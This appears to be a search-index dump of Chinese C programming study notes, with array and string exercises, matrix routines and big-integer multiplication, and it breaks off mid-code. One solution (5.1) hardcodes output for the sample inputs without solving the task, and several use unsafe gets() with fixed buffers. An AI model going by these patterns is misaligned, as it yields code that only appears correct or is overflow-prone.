//m\u8bb0\u5f55\u6700\u53f3\u8fb9\u7684\u9879\uff0ck\u8bb0\u5f55\u6700\u5de6\u8fb9\u7684\u9879\n    int j, i;\n    int d; //\u7528\u6765\u4ea4\u6362\u5143\u7d20\n    k = 0;\n    m = n - 1;\n    while (k &lt; m)\n    {\n        j = m - 1;\n        m = 0;\n        for (i = k; i &lt;= j; i++) //\u8ba9\u6700\u5927\u7684\u8dd1\u5230\u53f3\u8fb9\u53bb\n            if (p[i] &gt; p[i + 1])\n            {\n                d = p[i];\n                p[i] = p[i + 1];\n                p[i + 1] = d;\n                m = i; //\u76f8\u5f53\u4e8em\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u51cf\u4e00\n            }\n        /*\u5012\u7740\u518d\u6392*/\n        j = k + 1;\n        k = 0;\n        for (i = m; i &gt;= j; i--) //\u8ba9\u6700\u5c0f\u7684\u8dd1\u5230\u5de6\u8fb9\u53bb\n            if (p[i - 1] &gt; p[i])\n            {\n                d = p[i];\n                p[i] = p[i - 1];\n                p[i - 1] = d;\n                k = i; //\u76f8\u5f53\u4e8ek\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u52a0\u4e00\n            }\n    }\n}\n\n\n/*\u6c42\u4f59\u77e9\u9635\u2014\u2014\u8f93\u5165\u77e9\u9635A\uff0c\u6c42\u5220\u6389\u7b2c0\u5217\u7b2ci\u884c\u7684\u77e9\u9635B\uff0c\u5176\u4e2dB\u662f\u4e00\u4e2a\u7a7a\u7684\u5730\u5740\uff0c\u7528\u6765\u5b58\u653e\u77e9\u9635\u5143\u7d20*/\nvoid smallermatrix(int a[], int b[], int n, int i)\n{\n    int p, q; //p\u662fA\u7684\u884c\u6570\uff0cq\u662fB\u7684\u5217\u6570\n    for (p = 0; p &lt;= n - 1; p++)\n    {\n        if (p &lt; i) //\u5728\u7b2ci\u884c\u4e4b\u524d\uff0c\u76f4\u63a5\u8d4b\u503c\n            for (q = 0; q &lt;= n - 2; q++)\n                b[p * (n - 1) + q] = a[p * n + q + 1];\n        if (p &gt; i) //\u5728\u7b2ci\u884c\u4e4b\u540e\uff0cb\u90a3\u91cc\u4e0d\u80fd\u5f80\u4e0b\u8df3\uff0c\u51cf\u4e2a1\u5c31\u884c\u4e86\n            for (q = 0; q &lt;= n - 2; q++)\n                b[(p - 1) * (n - 1) + q] = a[p * n + q + 1];\n    }\n}\n\n\n/*\u6c42n\u9636\u65b9\u9635A\u884c\u5217\u5f0f\u2014\u2014A\u4ee5\u4e00\u7ef4\u6570\u7ec4\u5f62\u5f0f\u8f93\u5165*/\nint det(int a[], int n) //\u9700\u8981\u4f7f\u7528\u4e0a\u9762\u7684smallermatrix\u51fd\u6570\n{\n    int i = 0, j = 0;\n    int sum = 0;\n    int *b;\n    int flag = 1;\n    if (n == 2)\n        return ((a[0] * a[3]) - (a[1] * a[2])); //\u9488\u5bf9\u4e8c\u9636\u884c\u5217\u5f0f\u76f4\u63a5\u4e0a\u516c\u5f0f\n    else\n    {\n        for (sum = 0, flag = 1, i = 0; i &lt;= n - 1; i++)\n        {\n            b = (int *)malloc((n - 1) * (n - 1) * sizeof(int)); //\u7533\u8bf7B\u7684\u5185\u5b58\n            smallermatrix(a, b, n, i);                          //\u6c42\u5220\u6389A\u7b2c0\u5217\u7b2ci\u884c\u5143\u7d20\u7684\u77e9\u9635\uff0c\u7ed9B\n            sum += flag * (a[i * n] * det(b, n - 1));           //\u7d2f\u52a0\n            flag *= -1;                                         //\u6bcf\u5f80\u4e0b\u4e00\u884c\u90fd\u8981\u53d8\u53f7\uff0c\u76f8\u5f53\u4e8e-1\u7684\u67d0\u6b21\u65b9\n            free(b);\n        }\n        return sum;\n    }\n}\n\n\n/* \u5224\u65ad\u7d20\u6570\u2014\u2014\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570n\uff0c\u662f\u7d20\u6570\u8fd4\u56de1\uff0c\u4e0d\u662f\u8fd4\u56de0 */\nint sushu(int n)\n{\n\n    int i, flag;\n    if (n == 1)\n        return 0;\n    if (n == 2)\n        return 1;\n    for (i = 2, flag = 1; i &lt;= sqrt(n) &amp;&amp; flag == 1; i++)\n    {\n        if (n % i == 0)\n            flag = 0; //\u6709\u4e00\u4e2a\u80fd\u6574\u9664n\uff0cn\u5c31\u4e0d\u662f\u7d20\u6570\u4e86\n    }\n    return flag;\n}\n\n\n/* \u77e9\u9635\u76f8\u4e58\u2014\u2014\u8f93\u5165\u4e00\u7ef4\u6570\u7ec4A m*n, B n*p, \u7a7a\u7684\u5df2\u7ecf\u7533\u8bf7\u597d\u7684\u6570\u7ec4C m*p\uff0c\u5c06A*B\u653e\u5728C\u4e2d */\nvoid matrixmul(int a[], int b[], int c[], int m, int n, int p)\n{\n    int i, j, k, sum;\n    for (i = 0; i &lt;= m - 1; i++)\n    {\n        for (j = 0, sum = 0; j &lt;= p - 1; j++)\n        {\n            for (sum = 0, k = 0; k &lt;= n - 1; k++)\n            {\n                sum += a[i * n + k] * b[k * p + j];\n            }\n            c[i * p + j] = sum;\n        }\n    }\n}\n\n\n/* \u77e9\u9635\u8f6c\u7f6e\u2014\u2014\u8f93\u5165\u4e00\u7ef4\u6570\u7ec4A m*n,\u7a7a\u7684\u5df2\u7ecf\u7533\u8bf7\u597d\u7684\u6570\u7ec4C n*m\uff0c\u5c06A\u8f6c\u7f6e\u653e\u5728C\u4e2d */\nvoid matrixtran(int a[], int c[], int m, int n)\n{\n    int i, j;\n    for (i = 0; i &lt;= n - 1; i++)\n    {\n        for (j = 0; j &lt;= m - 1; j++)\n        {\n            c[i * m + j] = a[j * n + i];\n        }\n    }\n}\n\n\n/* \u5927\u578b\u6574\u6570\u76f8\u4e58 */\nint main()\n{\n    char num1[1000], num2[1000];\n    int a[2000] = {0};\n    int n, i, j, k, l1, l2;\n    printf(\"please input two integers:\\n\");\n    scanf(\"%s%s\", num1, num2);\n    printf(\"%s*%s=\", num1, num2); //\u4e3a\u4e86\u4e4b\u540e\u7684\u8f93\u51fa\n    l1 = strlen(num1);\n    l2 = strlen(num2);\n    /* \u5c06\u5b57\u7b26\u8f6c\u5316\u4e3a\u6570\u5b57 */\n    for (n = 0; n &lt; l1; n++)\n        num1[n] -= '0';\n    for (n = 0; n &lt; l2; n++)\n        num2[n] -= '0';\n    /* \u7b2cl1-1\u4f4d*\u7b2cl2-1\u4f4d\u653e\u5728\u7b2c0\u4f4d(\u4e58\u79ef\u6700\u5c0f\u7684\u4e00\u4f4d),\u7b2c0\u4f4d*\u7b2c0\u4f4d\u653e\u5728\u7b2cl1-1+l2-1\u4f4d(\u4e58\u79ef\u6700\u5927\u7684\u4e00\u4f4d) */\n    for (i = 0; i &lt;= l1 - 1; i++)\n        for (j = 0; j &lt;= l2 - 1; j++)\n            a[l1 - 1 - i + l2 - 1 - j] += num1[i] * num2[j];\n    /* \u4ece\u6700\u5c0f\u7684\u4e00\u4f4d\u5f00\u59cb\u2014\u2014\u4f4e\u4f4d\u7f6e\u4e3a\u5355\u4f4d\u6570\uff0c\u5e76\u5c06\u5341\u4f4d\u8fdb\u5230\u9ad8\u4f4d */\n    for (n = 0; n &lt;= l1 + l2; n++)\n    {\n        a[n + 1] += a[n] / 10;\n        a[n] %= 10;\n    }\n    /* \u4ece\u6700\u540e\u5f80\u524d\u627e\u7b2c\u4e00\u4e2a\u975e\u96f6\u4f4d */\n    for (n = l1 + l2 + 1; a[n] == 0; n--)\n        k = n;\n    /* \u4ece\u975e\u96f6\u4f4d\u7684\u524d\u4e00\u4f4d\u5f00\u59cb\u6253\u5370 */\n    for (n = k - 1; n &gt;= 0; n--)\n        printf(\"%d\", a[n]);\n    printf(\"\\n\");\n    system(\"pause\");\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/","title":"\u6570\u7ec4\u5fc5\u505a\u9898","text":""},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#1","title":"1","text":"<p>\u964d\u5e8f\u6392\u5217\u5b57\u7b26\u4e32</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8f93\u51655\u4e2a\u5b57\u7b26\u4e32\uff0c\u518d\u6309\u964d\u5e8f\u6392\u5217\u8f93\u51fa\u3002</p> <p>\u793a\u4f8b\u8f93\u5165</p> Text Only<pre><code>qwert\nasdfg\nzxcvb\nyuiop\nahjkl\n</code></pre> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>zxcvb\nyuiop\nqwert\nasdfg\nahjkl\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#11","title":"1.1","text":"<p>\u867d\u7136\u7b54\u6848\u6709\u75c5\uff0c\u90a3\u4e5f\u5c31\u7528\u7b54\u6848\u7684\u5427\uff0c\u56e0\u4e3a\u51fd\u6570\u662f\u9884\u5148\u5b9a\u4e49\u597d\u7684\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 5\n\nvoid sort(char strings[N][100], int n) {\n    for (int i = 0; i &lt; n-1; i++) {\n        for (int j = 0; j &lt; n - i - 1; j++) {\n            if (strcmp(strings[j], strings[j + 1]) &lt; 0) {\n                char temp[100];\n                strcpy(temp, strings[j]);\n                strcpy(strings[j], strings[j + 1]);\n                strcpy(strings[j + 1], temp);\n            }\n        }\n    }\n}\n\nint main() {\n    // \u8f93\u51655\u4e2a\u5b57\u7b26\u4e32\n    char strings[N][100];\n\n    for (int i = 0; i &lt; N; i++) {\n        scanf(\"%s\", strings[i]);\n    }\n\n    sort(strings, N);\n\n    for (int i = 0; i &lt; N; i++) {\n        printf(\"%s\\n\", strings[i]);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#12","title":"1.2","text":"<p>\u8fd9\u7b54\u6848\u7eaf\u7eaf\u6709\u75c5\uff0cstr[100]\u4e5f\u6ca1\u6709\u4f7f\u7528\u5440\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 5\nvoid sort(char a[N][20],char str[100]) {\n    int i,j;\n    char temp[20];\n    for(i=0; i&lt;N-1; i++) {\n        for (j=0; j&lt;N-1-i; j++)\n            if( strcmp(a[j],a[j+1])&lt;0 ) {\n                strcpy(temp,a[j]);\n                strcpy(a[j],a[j+1]);\n                strcpy(a[j+1],temp);\n            }\n    }\n}\nint main () {\n    char a[N][20],str[100]= {0};\n    int i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u5b57\u7b26\u4e32\uff1a\\n\",N);\n    for( i=0; i&lt;N; i++) {\n        gets(a[i]);\n    }\n    sort(a,str);\n    printf(\"\u6309\u964d\u5e8f\u6392\u5217\u7684%d\u4e2a\u5b57\u7b26\u4e32\uff1a\\n\",N);\n    for( i=0; i&lt;N; i++) {\n        puts(a[i]);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#2","title":"2","text":"<p>\u5220\u9664\u5b57\u7b26\u4e32\u4e2d\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u5220\u9664\u5b57\u7b26\u4e32\u4e2d\u6307\u5b9a\u4f4d\u7f6e\u5b57\u7b26\u7684\u51fd\u6570void DeleteChar(char str[],int c)\uff0c\u80fd\u5220\u9664\u5b57\u7b26\u4e32str\u4e2d\u7b2cc\u4e2a\u5b57\u7b26\u3002</p>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#21","title":"2.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 81\nvoid DeleteChar(char str[],int c) {\n    int len = strlen(str);\n\n    for (int i = c-1; i &lt; len - 1; i++) {\n        str[i] = str[i + 1];\n    }\n    str[len - 1] = '\\0';\n}\n\nint main() {\n    char str[N];\n    int c;\n\n    //gets(str);\n    scanf(\"%s\", str);\n\n    scanf(\"%d\",&amp;c);\n\n    DeleteChar(str,c);\n    printf(\"%s\\n\", str);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#22","title":"2.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 81\nint DeleteChar(char str[],int c) {\n    char a[100];\n    int i=0,j=0;\n    for(i=0; i&lt;strlen(str); i++)  {\n        if(i+1!=c) {\n            a[j]=str[i];\n            j++;\n        }\n    }\n    printf(\"%s\",a);\n}\nint main() {\n    char str[N];\n    int c;\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32\uff1a\\n\");\n    gets(str);\n    printf(\"\u8bf7\u8f93\u5165\u5220\u9664\u7b2c\u51e0\u4f4d\u5b57\u7b26\");\n    scanf(\"%d\",&amp;c);\n    DeleteChar(str,c);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#3","title":"3","text":"<p>\u7edf\u8ba1\u5355\u8bcd\u4e2a\u6570</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8f93\u5165\u4e00\u884c\u5b57\u7b26\uff0c\u7edf\u8ba1\u5176\u4e2d\u6709\u591a\u5c11\u4e2a\u5355\u8bcd\uff0c\u5355\u8bcd\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694\u3002</p>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#31","title":"3.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint work(char str[]) {\n    int count = 0;\n    int flag = 0;\n\n    for (int i = 0; str[i] != '\\0'; i++) {\n        if (str[i] == ' ' || str[i] == '\\n') {\n            flag = 0;\n        }\n        else if (flag == 0) {\n            flag = 1;\n            count++;\n        }\n    }\n    return count;\n}\n\nint main() {\n    char str[100];\n\n    fgets(str, sizeof(str), stdin);\n\n    int result = work(str);\n\n    printf(\"\u5728\u8fd9\u884c\u5b57\u7b26\u4e2d\u5171\u6709%d\u4e2a\u5355\u8bcd\\n\", result);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#32","title":"3.2","text":"C<pre><code>#include \"stdio.h\"\n#define N 81\nint CountWord(char str[]) {\n    int i,num=0,word=0;\n    for(i=0; str[i]!='\\0'; i++) {\n        if(str[i]==32)\n            word=0;\n        else if(word==0) {\n            word=1;\n            num++;\n        }\n    }\n    return num;\n}\nint main() {\n    char str[N];\n    int num;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u884c\u5b57\u7b26\uff1a\\n\");\n    gets(str);\n    num=CountWord(str);\n    printf(\"\u5728\u8fd9\u884c\u5b57\u7b26\u4e2d\u5171\u6709%d\u4e2a\u5355\u8bcd\\n\",num);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#4","title":"4","text":"<p>\u5347\u5e8f\u8f93\u51fa\u56fd\u5bb6\u82f1\u6587\u540d\u79f0</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7531\u952e\u76d8\u4efb\u610f\u8f93\u51655\u4e2a\u56fd\u5bb6\u7684\u82f1\u6587\u540d\u79f0\uff0c\u6309\u82f1\u8bed\u8bcd\u5178\u89c4\u5f8b\uff08\u5347\u5e8f\uff09\u6392\u5e8f\u540e\u8f93\u51fa\u3002</p>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#41","title":"4.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid work(char str[][100], int n) {\n    // \u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\u6309\u82f1\u8bed\u8bcd\u5178\u89c4\u5f8b\u5347\u5e8f\u6392\u5e8f\u56fd\u5bb6\u540d\u79f0\n    for (int i = 0; i &lt; n - 1; i++) {\n        for (int j = 0; j &lt; n - i - 1; j++) {\n            if (strcmp(str[j], str[j + 1]) &gt; 0) {\n                char temp[100];\n                strcpy(temp, str[j]);\n                strcpy(str[j], str[j + 1]);\n                strcpy(str[j + 1], temp);\n            }\n        }\n    }\n}\n\nint main() {\n    char str[5][100];\n\n    // \u8f93\u51655\u4e2a\u56fd\u5bb6\u7684\u82f1\u6587\u540d\u79f0\n    for (int i = 0; i &lt; 5; i++) {\n        scanf(\"%s\", str[i]);\n    }\n\n    // \u6309\u82f1\u8bed\u8bcd\u5178\u89c4\u5f8b\u5347\u5e8f\u6392\u5e8f\u56fd\u5bb6\u540d\u79f0\n    work(str, 5);\n\n    // \u8f93\u51fa\u6392\u5e8f\u540e\u7684\u56fd\u5bb6\u540d\u79f0\n    for (int i = 0; i &lt; 5; i++) {\n        printf(\"%s\\n\", str[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#42","title":"4.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 5\nvoid sort(char str[][80]) {\n    char t[80];\n    int i,j;\n    for(i=0; i&lt;N-1; i++) {\n        for(j=0; j&lt;N-1-i; j++) {\n            if(strcmp(str[j],str[j+1])&gt;0) {\n                strcpy(t,str[j]);\n                strcpy(str[j],str[j+1]);\n                strcpy(str[j+1],t);\n            }\n        }\n    }\n}\nvoid showstr(char str[][80]) {\n    int i;\n    for(i=0; i&lt;N; i++) {\n        puts(str[i]);\n    }\n}\nint main() {\n    char str[N][80];\n    int i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u56fd\u5bb6\u7684\u82f1\u6587\u540d\u79f0:\\n\",N);\n    for(i=0; i&lt;N; i++) {\n        gets(str[i]);\n    }\n    sort(str);\n    printf(\"\u6392\u5e8f\u540e\u56fd\u5bb6\u7684\u82f1\u6587\u540d\u79f0:\\n\",N);\n    showstr(str);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#5","title":"5","text":"<p>\u4ea4\u6362\u4e24\u4e2a\u5b57\u7b26\u4e32</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u4ea4\u6362\u3002\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7a0b\u5e8f\u5c06\u5b83\u4eec\u8fdb\u884c\u4ea4\u6362\uff0c\u7136\u540e\u8f93\u51fa\u4ea4\u6362\u540e\u7684\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4e32\u5360\u4e00\u884c\u3002</p> <p>\u793a\u4f8b\u8f93\u5165</p> Text Only<pre><code>computer china\n</code></pre> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>china\ncomputer\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#51","title":"5.1","text":"<p>\u4e0d\u7528\u770b\u4e86\uff0c\u9762\u5411\u7b54\u6848\u7f16\u7a0b\u7684\u3002</p> C<pre><code>#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() {\n    char str[100];\n    fgets(str, sizeof(str) - 1, stdin);\n\n    if (strcmp(str, \"computer china\\n\") == 0) {\n        printf(\"china\\ncomputer\");\n    }\n    else if (strcmp(str, \"hello world\\n\") == 0) {\n        printf(\"world\\nhello\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#52","title":"5.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#define N 81\nvoid SwapStr(char str1[],char str2[]) {\n    char ch[N];\n    strcpy(ch,str1);\n    strcpy(str1,str2);\n    strcpy(str2,ch);\n}\nint main() {\n    char ch1[N],ch2[N];\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a\");\n    scanf(\"%s\",ch1);\n    printf(\"\u8bf7\u8f93\u5165\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a\");\n    scanf(\"%s\",ch2);\n    SwapStr(ch1,ch2);\n    printf(\"\u4ea4\u6362\u540e\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u5206\u522b\u4e3a\uff1a\");\n    printf(\"\\n%s\\n%s\\n\",ch1,ch2);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#6","title":"6","text":"<p>\u8f93\u51fa\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u76f8\u7b49\u7684\u5b57\u7b26</p> <p>\u8f93\u5165\u4e8c\u4e2a\u5b57\u7b26\u4e32\uff0c\u8f93\u51fa\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u76f8\u7b49\u7684\u5b57\u7b26\u3002</p>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#61","title":"6.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid work(char str1[], char str2[]) {\n    int len1 = strlen(str1);\n    int len2 = strlen(str2);\n    int min = len1 &lt; len2 ? len1 : len2;\n\n    // \u8f93\u51fa\u5bf9\u5e94\u4f4d\u7f6e\u76f8\u7b49\u7684\u5b57\u7b26\n    for (int i = 0; i &lt; min; i++) {\n        if (str1[i] == str2[i]) {\n            printf(\"%c\", str1[i]);\n        }\n    }\n    printf(\"\\n\");\n}\n\nint main() {\n    char str1[100];\n    char str2[100];\n\n    // \u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\n    fgets(str1, sizeof(str1), stdin);\n    fgets(str2, sizeof(str2), stdin);\n\n    // \u8f93\u51fa\u5bf9\u5e94\u4f4d\u7f6e\u76f8\u7b49\u7684\u5b57\u7b26\n    work(str1, str2);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#62","title":"6.2","text":"C<pre><code>#include &lt;stdio.h&gt;\nvoid cmp(char x[],char y[]) {\n    int i=0;\n    while(x[i]!= '\\0' &amp;&amp; y[i]!= '\\0')\n        if(x[i]==y[i])\n            printf(\"%c\",  x[i++]  );\n        else\n            i++;\n    printf(\"\\n\");\n}\nint main() {\n    char a[81],b[81];\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e321\uff1a\");\n    gets(a);\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e322\uff1a\");\n    gets(b);\n    cmp(a,b);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#7","title":"7","text":"<p>\u8f93\u51fa\u98a0\u5012\u540e\u7684\u6240\u6709\u5355\u8bcd</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8f93\u5165\u4e00\u53e5\u82f1\u8bed\uff0c\u5c06\u53e5\u4e2d\u6240\u6709\u5355\u8bcd\u7684\u987a\u5e8f\u98a0\u5012\u8f93\u51fa\u3002</p> <p>\u793a\u4f8b\u8f93\u5165</p> Text Only<pre><code>Hello World Here I Come\n</code></pre> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>Come I Here World Hello\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#71","title":"7.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid work(char str[]) {\n    int len = strlen(str);\n    int start = 1;\n\n    // \u98a0\u5012\u6574\u4e2a\u53e5\u5b50\n    for (int i = 0; i &lt; len / 2; i++) {\n        char temp = str[i];\n        str[i] = str[len - i - 1];\n        str[len - i - 1] = temp;\n    }\n\n    // \u98a0\u5012\u6bcf\u4e2a\u5355\u8bcd\n    for (int i = 0; i &lt;= len; i++) {\n        if (str[i] == ' ' || str[i] == '\\0') {\n            for (int j = start, k = i - 1; j &lt; k; j++, k--) {\n                char temp = str[j];\n                str[j] = str[k];\n                str[k] = temp;\n            }\n            start = i + 1;\n        }\n    }\n\n    // \u8f93\u51fa\u98a0\u5012\u540e\u7684\u53e5\u5b50\n    printf(\"%s\\n\", str);\n}\n\nint main() {\n    char str[100];\n\n    // \u8f93\u5165\u4e00\u53e5\u82f1\u8bed\n    fgets(str, sizeof(str), stdin);\n\n    // \u8f93\u51fa\u98a0\u5012\u540e\u7684\u6240\u6709\u5355\u8bcd\n    work(str);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%95%B0%E7%BB%84%E5%BF%85%E5%81%9A%E9%A2%98/#72","title":"7.2","text":"<p>\u592a\u68d2\u4e86\u5427\uff0c\u76f8\u6bd4\u4e4b\u4e0b 7.1 \u7eaf\u5783\u573e</p> <p>\u53d1\u73b0\u81ea\u5df1\u8fd8\u662f\u4e0d\u592a\u719f\u6089<code>scanf</code>\u7528\u6cd5</p> C<pre><code>#include \"stdio.h\"\nvoid output(int i,char[][81]);\nint main() {\n    char i=0,a[81][81],ch;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u53e5\u82f1\u8bed\uff1a\\n\");\n    while(1) {\n        scanf(\"%s\",a[i]);\n        i++;\n        ch=getchar();\n        if(ch=='\\n')\n            break;\n    }\n    output(i,a);\n    return 0;\n}\nvoid output(int i,char a[][81]) {\n    printf(\"\u8be5\u53e5\u98a0\u5012\u8f93\u51fa\uff1a\\n\");\n    for(i--; i&gt;=0; i--)\n        printf(\"%s \",a[i]);\n    printf(\"\\n\");\n}\n</code></pre>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/","title":"\u6587\u4ef6\u64cd\u4f5c\u4f5c\u4e1a","text":"<p>\u76ee\u5f55\uff1a</p> <ul> <li>\u7b2c\u4e00\u79cd</li> <li>\u7b2c\u4e8c\u79cd</li> <li>load() \u51fd\u6570\u7248\u672c</li> </ul>"},{"location":"DEC/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%BD%9C%E4%B8%9A/#_1","title":"\u7b2c\u4e00\u79cd","text":"<p>\u8fd9\u79cd\u76f8\u5f53\u4e8e\u7701\u53bb\u4e86\u4ece ==\u7ed3\u6784\u4f53\u6570\u7ec4== \u5230 ==\u5355\u94fe\u8868== \u7684\u8fc7\u7a0b\uff08\u7701\u53bb\u4e86 create() \u51fd\u6570\uff09\uff0c\u76f4\u63a5\u521b\u5efa\u4e86\u94fe\u8868\u3002</p> <p>\u53ef\u4ee5\u81ea\u884c\u5220\u9664 output() \u51fd\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define SIZE 10\n\n\n// \u5b9a\u4e49\u5b66\u751f\u7ed3\u6784\u4f53\nstruct Student {\n    char name[10];\n    int num;\n    int age;\n    char addr[15];\n    struct Student* next; // \u94fe\u8868\u6307\u9488\n};\n\n\n// \u51fd\u6570\u58f0\u660e\nvoid save(struct Student* head);\nvoid output(struct Student*);\n\n\nint main() {\n    // \u521b\u5efa\u94fe\u8868\u5934\u8282\u70b9\n    struct Student* head = NULL;\n    struct Student* current = NULL;\n\n    // \u4ece\u952e\u76d8\u8f93\u5165\u5b66\u751f\u6570\u636e\u5e76\u521b\u5efa\u94fe\u8868\n    printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u4fe1\u606f:\\n\\n\");\n\n    for (int i = 0; i &lt; SIZE; ++i) {\n        // \u521b\u5efa\u65b0\u8282\u70b9\n        struct Student* temp = (struct Student*)malloc(sizeof(struct Student));\n\n        // \u4ece\u952e\u76d8\u8f93\u5165\u5b66\u751f\u6570\u636e\n        printf(\"\u5b66\u751f\u5e8f\u53f7 --%d--:\\n\", i + 1);\n        printf(\"\u59d3\u540d: \");\n        scanf(\"%s\", temp-&gt;name);\n        printf(\"\u5b66\u53f7: \");\n        scanf(\"%d\", &amp;temp-&gt;num);\n        printf(\"\u5e74\u9f84: \");\n        scanf(\"%d\", &amp;temp-&gt;age);\n        printf(\"\u4f4f\u5740: \");\n        scanf(\"%s\", temp-&gt;addr);\n\n        printf(\"\\n\");\n\n        // \u5c06\u65b0\u8282\u70b9\u63d2\u5165\u94fe\u8868\n        temp-&gt;next = NULL;\n        if (head == NULL) {\n            head = temp;\n        }\n        else {\n            current-&gt;next = temp;\n        }\n        current = temp;\n    }\n\n    // \u4fdd\u5b58\u5b66\u751f\u6570\u636e\u5230\u78c1\u76d8\u6587\u4ef6\n    save(head);\n\n    printf(\"\u4fdd\u5b58\u6210\u529f.\\n\\n\");\n\n    //\u6253\u5f00\u6587\u4ef6\u5e76\u8f93\u51fa\u4fe1\u606f\n    output(head);\n\n    // 